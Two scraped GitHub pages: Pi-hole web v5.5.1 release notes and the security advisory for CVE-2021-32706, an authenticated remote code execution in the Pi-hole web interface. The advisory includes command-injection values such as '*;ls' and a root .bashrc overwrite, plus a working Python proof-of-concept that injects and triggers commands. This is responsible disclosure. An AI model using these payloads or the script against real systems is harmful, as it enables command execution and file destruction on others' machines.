=== Content from github.com_e17b68f1_20250115_083621.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fweb%2Freleases%2Ftag%2Fv5.5.1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fweb%2Freleases%2Ftag%2Fv5.5.1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=pi-hole%2Fweb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pi-hole](/pi-hole)
/
**[web](/pi-hole/web)**
Public

* [Notifications](/login?return_to=%2Fpi-hole%2Fweb) You must be signed in to change notification settings
* [Fork
  565](/login?return_to=%2Fpi-hole%2Fweb)
* [Star
   2.1k](/login?return_to=%2Fpi-hole%2Fweb)

* [Code](/pi-hole/web/tree/v5.5.1)
* [Issues
  19](/pi-hole/web/issues)
* [Pull requests
  8](/pi-hole/web/pulls)
* [Actions](/pi-hole/web/actions)
* [Projects
  1](/pi-hole/web/projects)
* [Security](/pi-hole/web/security)
* [Insights](/pi-hole/web/pulse)

Additional navigation options

* [Code](/pi-hole/web/tree/v5.5.1)
* [Issues](/pi-hole/web/issues)
* [Pull requests](/pi-hole/web/pulls)
* [Actions](/pi-hole/web/actions)
* [Projects](/pi-hole/web/projects)
* [Security](/pi-hole/web/security)
* [Insights](/pi-hole/web/pulse)

1. [Releases](/pi-hole/web/releases)
2. [v5.5.1](/pi-hole/web/releases/tag/v5.5.1)

# Pi-hole web v5.5.1

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/pi-hole/web/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v5.5.1)

 Loading

[View all tags](/pi-hole/web/tags)

![@PromoFaux](https://avatars.githubusercontent.com/u/1998970?s=40&v=4)
[PromoFaux](/PromoFaux)
released this
04 Aug 17:22

¬∑
[1309 commits](/pi-hole/web/compare/v5.5.1...master)
to master
since this release

[v5.5.1](/pi-hole/web/tree/v5.5.1)

[`fb9bd56`](/pi-hole/web/commit/fb9bd561fdf936891370d85b32e899dff1dbf9d4)

This commit was created on GitHub.com and signed with GitHub‚Äôs **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

Hotfix release to address two security advisories:

[GHSA-g3w6-q4fg-p8x8](https://github.com/pi-hole/web/security/advisories/GHSA-g3w6-q4fg-p8x8 "GHSA-g3w6-q4fg-p8x8") - "Stored XSS Vulnerability in the Pi-hole Webinterface" reported by both Dariusz Go≈Ñda and [@awareseven](https://github.com/awareseven)

[GHSA-5cm9-6p3m-v259](https://github.com/pi-hole/web/security/advisories/GHSA-5cm9-6p3m-v259 "GHSA-5cm9-6p3m-v259") - "(Authenticated) Remote Code Execution Possible in Web Interface 5.5" reported by [@SchneiderSec](https://github.com/SchneiderSec)

### Contributors

* [![@SchneiderSec](https://avatars.githubusercontent.com/u/44183268?s=64&v=4)](https://github.com/SchneiderSec)
* [![@awareseven](https://avatars.githubusercontent.com/u/53170037?s=64&v=4)](https://github.com/awareseven)

SchneiderSec and awareseven

 Assets
2

 Loading

 üéâ
2
 1reverseengineer and nabakdev reacted with hooray emoji
 ‚ù§Ô∏è
38
 OpalSec, piogg, RealDrPuc, JJJ, mbashir2, caio-vinicius, Jai5-lang, kalpak44, dekiesel, bhornsby, and 28 more reacted with heart emoji

All reactions

* üéâ
  2 reactions
* ‚ù§Ô∏è
  38 reactions

 40 people reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_334e384e_20250115_083623.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fweb%2Fsecurity%2Fadvisories%2FGHSA-5cm9-6p3m-v259)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpi-hole%2Fweb%2Fsecurity%2Fadvisories%2FGHSA-5cm9-6p3m-v259)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=pi-hole%2Fweb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pi-hole](/pi-hole)
/
**[web](/pi-hole/web)**
Public

* [Notifications](/login?return_to=%2Fpi-hole%2Fweb) You must be signed in to change notification settings
* [Fork
  565](/login?return_to=%2Fpi-hole%2Fweb)
* [Star
   2.1k](/login?return_to=%2Fpi-hole%2Fweb)

* [Code](/pi-hole/web)
* [Issues
  19](/pi-hole/web/issues)
* [Pull requests
  8](/pi-hole/web/pulls)
* [Actions](/pi-hole/web/actions)
* [Projects
  1](/pi-hole/web/projects)
* [Security](/pi-hole/web/security)
* [Insights](/pi-hole/web/pulse)

Additional navigation options

* [Code](/pi-hole/web)
* [Issues](/pi-hole/web/issues)
* [Pull requests](/pi-hole/web/pulls)
* [Actions](/pi-hole/web/actions)
* [Projects](/pi-hole/web/projects)
* [Security](/pi-hole/web/security)
* [Insights](/pi-hole/web/pulse)

# (Authenticated) Remote Code Execution Possible in Web Interface 5.5

High

[PromoFaux](/PromoFaux)
published
GHSA-5cm9-6p3m-v259
Aug 4, 2021

## Package

Pi-hole Web Interface

## Affected versions

<=5.5

## Patched versions

None

## Description

### PiHole Vulnerability Disclosure (SchneiderSec)

**Foreword**: This vulnerability was identified by Chris Schneider my github username is (SchneiderSec)

an independent security researcher. This disclosures comes as an effort to protect other consumers of

the Pi-Hole application.

**Type of Vulnerability**: (Authenticated) Remote Code Execution

**CVSS Score**: 7.6 High CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H

Affected Component:

* Pi-hole v5.3.1
* Web Interface v5.5
* FTL v5.8.1

**Summary:** The `validDomainWildcard` preg\_match filter allows a malicious character through that

can be used to execute code, list directories, and overwrite sensitive files.

**Technical Description:**

The issue lies in the fact that one of the periods is not escaped allowing any character to be used in it's

place.

[![image](https://user-images.githubusercontent.com/1998970/121876497-76662880-cd01-11eb-99cc-79228b402b92.png)](https://user-images.githubusercontent.com/1998970/121876497-76662880-cd01-11eb-99cc-79228b402b92.png)

This check is used in two places, to validate the clients and domains.

[![image](https://user-images.githubusercontent.com/1998970/121876530-80882700-cd01-11eb-8fb5-2c7d1d4fe161.png)](https://user-images.githubusercontent.com/1998970/121876530-80882700-cd01-11eb-8fb5-2c7d1d4fe161.png)

Assuming a payload of `*;ls` is passed through, it will successfully pass the check and get

concatenated at the pihole\_execute. This pihole\_execute command will add this string to the

`/etc/pihole/setupVars.conf` file. Example with our payload of `*;ls`:

[![image](https://user-images.githubusercontent.com/1998970/121876591-939af700-cd01-11eb-8865-9173315a2c5c.png)](https://user-images.githubusercontent.com/1998970/121876591-939af700-cd01-11eb-8865-9173315a2c5c.png)

Showing the contents of `/etc/pihole/setupVars.conf`

[![image](https://user-images.githubusercontent.com/1998970/121876637-a281a980-cd01-11eb-82d5-36f1684654ae.png)](https://user-images.githubusercontent.com/1998970/121876637-a281a980-cd01-11eb-82d5-36f1684654ae.png)

This alone does not present an issue, but when this file gets sourced the text following the ; will be

treated as a command. To trigger the sourcing we simply need to run go to the gravity endpoint

`/admin/gravity.php` and click update.

[![image](https://user-images.githubusercontent.com/1998970/121876668-add4d500-cd01-11eb-9503-6a2feb89fa4b.png)](https://user-images.githubusercontent.com/1998970/121876668-add4d500-cd01-11eb-9503-6a2feb89fa4b.png)

You will notice this also gives you the output of command that was run.

I mentioned file overwrite and this can happen if instead of running a command you redirect output to a file for example a payload of `*>FILENAME` will output FILENAME to the `/var/www/html/admin/scripts/pi-hole/php/` directory. This allows an attacker to overwrite any

php file in there effectively breaking PiHole.

You can also overwrite/list the root users files. To do this you would just need to change the context with domains parameter first and then run the command via the clients parameter:

`domains=*;cd&clients=*>.bashrc` . Running cd changes the processes current directory to /root and clients will overwrite the root users

bashrc. Shutdown will completely turn of the users machine.

It's worth noting someone much more familiar with Linux may be able to fully execute commands but I hope this already demonstrated enough impact.

**Proof of Concept:**

Here is some proof of concept code to assist:

```
import sys
import requests
from urllib.parse import quote
from bs4 import BeautifulSoup
if len(sys.argv) != 3:
 print(f'[+] {sys.argv[0]} <target:http://127.0.0.1> <adminPassword>')
 sys.exit(-1)
s = requests.Session()
token = ""
headers={'Content-Type': 'application/x-www-form-urlencoded'}
url = sys.argv[1]
def main():
 getCookieAndToken()
 sendPayload()
 callGravity()
def getCookieAndToken():
 print('[+] Logging in to get cookie and token.')
 try:
 global token
 password = sys.argv[2]
 if "http" not in url:
 print("Target has to be the base address: http://127.0.0.1")
 r = s.post(f'{url}/admin/index.php?login', data=f"pw={password}",
headers=headers )
 formatted = BeautifulSoup(r.text, 'html.parser')
 token = quote(formatted.find(id="token").get_text())
 if not token:
 print('Unable to get token.')
 raise Exception
 except:
 print("Wrong password or other failure.")
 sys.exit(-1)
def sendPayload():
 try:
 commands = ['dir', 'id']
 payload = f"domains=*;{commands[0]}&clients=*;
{commands[1]}&permitted=on&querylog-blocked=on&field=API&token={token}"
 r = s.post(f'{url}/admin/settings.php?tab=api', data=payload,
headers=headers )
 if "updated" not in r.text:
 print("[*] ERROR: Unable to edit settings. Exploit failed.
Patched?")
 raise Exception
 print("[+] Injected command into /etc/pihole/setupVars.conf")
 except:
 sys.exit(-1)
def callGravity():
 print("[+] Triggering command with gravity. If there is no output that
doesn't mean it didn't run.")
 r = s.get(f'{url}/admin/scripts/pi-hole/php/gravity.sh.php')
 lines = r.text.split('\n')
 for line in lines:
 if "Neutrino" in line:
 break
 print(line.replace("data: ", ""))
if __name__ == "__main__":
 main()
```

usage: `python3 poc.py http://pihole/ adminPW`

By default this will run dir and id commands. The output should show the files in

`/var/www/html/admin/scripts/pi-hole/php` and root as the user. You can modify the payload in

the sendPayload functions

### Severity

High

### CVE ID

CVE-2021-32706

### Weaknesses

No CWEs

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


